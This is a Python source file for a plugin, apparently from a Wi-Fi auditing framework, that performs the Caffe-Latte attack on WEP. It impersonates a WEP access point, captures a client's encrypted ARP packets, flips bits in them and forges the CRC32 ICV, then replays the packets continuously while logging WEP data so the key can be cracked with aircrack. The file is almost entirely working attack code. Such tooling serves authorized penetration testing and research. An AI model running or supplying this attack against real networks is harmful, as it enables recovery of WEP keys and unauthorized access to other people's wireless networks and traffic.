# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network.

You can then check the wep data log and launch aircrack on it.
"""
from AuxiliaryModules.packet import ClientPacket
from AuxiliaryModules.minwepap import MinimalWEP
from AuxiliaryModules.tcpdumplogger import TCPDumpLogger
from AuxiliaryModules.events import SuccessfulEvent, UnsuccessfulEvent, NeutralEvent
from SessionManager.sessionmanager import SessionManager
from plugin import AirScannerPlugin, AirInjectorPlugin
from random import randint
from scapy.all import Dot11, Dot11WEP, conf
from struct import pack
from time import strftime, sleep
from threading import Thread
from utils.crc import calc_crc32


# Should be an AirHostPlugin but hostapd cannot send
# successfull auth responses to any credentials,
# that is why MinimalWEP had to be created
class CaffeLatte(AirScannerPlugin, AirInjectorPlugin):

    def __init__(self, config):
        super(CaffeLatte, self).__init__(config, "caffelatte")
        self.sniffing_interface = self.config["sniffing_interface"]
        self.ap_ssid = self.config["ap_ssid"]
        self.ap_bssid = self.config["ap_bssid"]
        self.destination_folder = self.config["caffelatte_log"]
        try:
            self.channel = int(self.config["fixed_sniffing_channel"])
            self.notification_divisor = int(self.config["notification_divisor"])
        except:
            print "[-] 'sniffing_channel' and 'notification_divisor' must be Integer."
            print "[-] Setting to default values: channel = 11, notification_divisor = 2000"
            self.channel = 11
            self.notification_divisor = 2000

        self.wep_ap = MinimalWEP(self.ap_ssid, self.ap_bssid, self.channel, self.sniffing_interface)
        self.tcpdump_logger = None  # tcpdump is used to capture packets because scapy is too slow and drops too many
        self.replay_attack_running = False
        self.replay_attack_thread = None
        self.filename = None

        self.original_arp_packets = []
        self.flipped_arp_packets = []
        self.target_client_mac = None

        self.n_captured_data_packets = 0
        self.n_arp_packets_sent = 0

    def identify_arp_packet(self, packet):
        return len(packet[Dot11WEP].wepdata) == 36 and \
            packet[Dot11].addr1 == self.ap_bssid and  \
            packet[Dot11].addr3 == "ff:ff:ff:ff:ff:ff"

    def flip_bits(self, packet):
        wepdata = packet[Dot11WEP].wepdata
        # Skip first 4 bytes corresponding to IV and KeyID
        # The ICV is included in the cyphertext and corresponds to the last 4 bytes
        cyphertext = str(packet[Dot11WEP])[4:]

        flipped_packet = packet.copy()  # Preserve the original wep packet
        # Create bitmask with same size as the encrypted wepdata, excluding the ICV
        bitmask = list('\x00' * len(wepdata))
        # Flip bits of the bitmask corresponding to the last byte of sender MAC and IP respectively
        bitmask[len(wepdata) - 15] = chr(randint(0, 255))
        bitmask[len(wepdata) - 11] = chr(randint(0, 255))

        # Create crc32 checksum for the bitmask
        icv_patch = calc_crc32(bitmask)
        icv_patch_bytes = pack("<I", icv_patch)
        final_bitmask = bitmask + list(icv_patch_bytes)  # Append the ICV patch to the bitmask data

        # Now apply the 'patch' to the wepdata and the icv by XORing the final_bitmask with the original cyphertext
        flipped_result = [ chr( ord(cyphertext[i]) ^ ord(final_bitmask[i]) ) for i in range(len(cyphertext)) ]
        final_result = str(packet[Dot11WEP])[:4] + "".join(flipped_result)

        # Put the results back in the packet
        flipped_packet[Dot11WEP] = Dot11WEP(final_result)
        # Now lets change the 802.11 information header to make it look like it came from a client.
        flipped_packet[Dot11].FCfield = "from-DS+retry+wep"
        flipped_packet[Dot11].addr1 = "ff:ff:ff:ff:ff:ff"
        flipped_packet[Dot11].addr3 = (packet[Dot11].addr2[:-2] + "%02x") % randint(0, 255)
        flipped_packet[Dot11].addr2 = self.ap_bssid

        return flipped_packet

    def replay_attack(self):
        socket = conf.L2socket(iface = self.sniffing_interface)

        print "[+] Starting replay attack"
        while self.replay_attack_running:
            # Always send fresh new packets
            try:
                for p in self.flipped_arp_packets:
                    socket.send(p)
                    self.n_arp_packets_sent += 1
            except:
                # No buffer space available.. wait and keep sending
                sleep(.25)

        print "[+] Stopped replay attack from last ARP packet"
        socket.close()
        SessionManager().log_event(NeutralEvent("Stopped Caffe-Latte attack. Logged {} WEP Data packets."
                                                .format(self.tcpdump_logger.get_wep_data_count())))

    def pre_scanning(self):
        # Start WEP access point
        self.wep_ap.start()
        SessionManager().log_event(NeutralEvent(
                                  "Starting Minimalistic WEP AP with ssid '{}' to perform Caffe-Latte attack."
                                  .format(self.ap_ssid)))

    def prepare_logger(self, client_mac):
        # Prepare Log file
        timestr = strftime("%Y|%m|%d-%H|%M|%S")
        self.filename = "caffelatte_{s}_{c}_{t}.pcap".format(s = self.ap_ssid, c = client_mac, t = timestr)
        filter_str = "wlan type data and (wlan addr1 {c} or wlan addr2 {c} or wlan addr3 {c})".format(c=client_mac)

        self.tcpdump_logger = TCPDumpLogger(self.sniffing_interface,
                                            self.destination_folder + self.filename,
                                            filter_str)

    def flip_original_arp_packets(self):
        del self.flipped_arp_packets[:]
        for p in self.original_arp_packets:
            for i in range(5):
                self.flipped_arp_packets.append(self.flip_bits(p))  # Randomness is involved so it is not a duplicate packet.

    def handle_packet(self, packet):
        if not self.replay_attack_running:
            self.wep_ap.respond_to_packet(packet)

        if Dot11WEP in packet:
            if self.identify_arp_packet(packet):
                client_mac = ClientPacket(packet).client_mac

                if self.target_client_mac is None:
                    self.target_client_mac = client_mac

                if self.target_client_mac == client_mac and len(self.original_arp_packets) < 5:
                    print "[+] Found a new ARP packet"
                    print "[+] Flipping and adding to the flipped packets ring."
                    self.original_arp_packets.append(packet)
                    self.flip_original_arp_packets()
                    SessionManager().log_event(SuccessfulEvent(
                                              "Found ARP Packet from '{}' to perform Caffe-Latte attack."
                                              .format(self.target_client_mac)))

                if not self.replay_attack_running:
                    self.prepare_logger(client_mac)

                    self.replay_attack_running = True
                    self.replay_attack_thread = Thread(target=self.replay_attack)

                    self.replay_attack_thread.start()
                    self.tcpdump_logger.start_logging()

                else:
                    if  "iv" in packet[Dot11WEP].fields.keys():
                        self.n_captured_data_packets += 1   # increments count but only for comparison purposes
                                                            # real count is from tcpdump

                        if self.n_captured_data_packets % self.notification_divisor == 0 and \
                           self.n_captured_data_packets > 0:
                            self.n_captured_data_packets = self.tcpdump_logger.get_wep_data_count()
                            print "[+] tcpdump captured {} wep data packets so far...".format(self.n_captured_data_packets)

    def post_scanning(self):
        self.replay_attack_running = False
        self.wep_ap.shutdown()

        if self.tcpdump_logger is not None:
            if self.tcpdump_logger.is_logging():
                self.tcpdump_logger.stop_logging()

        if self.replay_attack_thread is not None:
            self.replay_attack_thread.join()
